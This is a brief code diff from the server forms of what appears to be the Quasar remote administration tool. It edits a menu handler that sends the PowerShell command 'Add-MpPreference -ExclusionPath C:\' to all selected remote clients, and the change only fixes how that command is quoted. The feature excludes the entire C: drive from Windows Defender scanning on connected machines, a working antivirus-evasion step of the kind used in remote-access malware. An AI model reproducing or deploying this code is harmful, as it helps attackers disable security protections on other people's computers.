@@ -842,7 +842,7 @@ namespace Quasar.Server.Forms
         private void addCDriveExceptionToolStripMenuItem_Click(object sender, EventArgs e)
         {
 
-            string powershellCode = "Add-MpPreference -ExclusionPath \"C:\\\"";
+            string powershellCode = "Add-MpPreference -ExclusionPath C:\\";
             DoSendQuickCommand quickCommand = new DoSendQuickCommand { Command = powershellCode };
 
             foreach (Client c in GetSelectedClients())
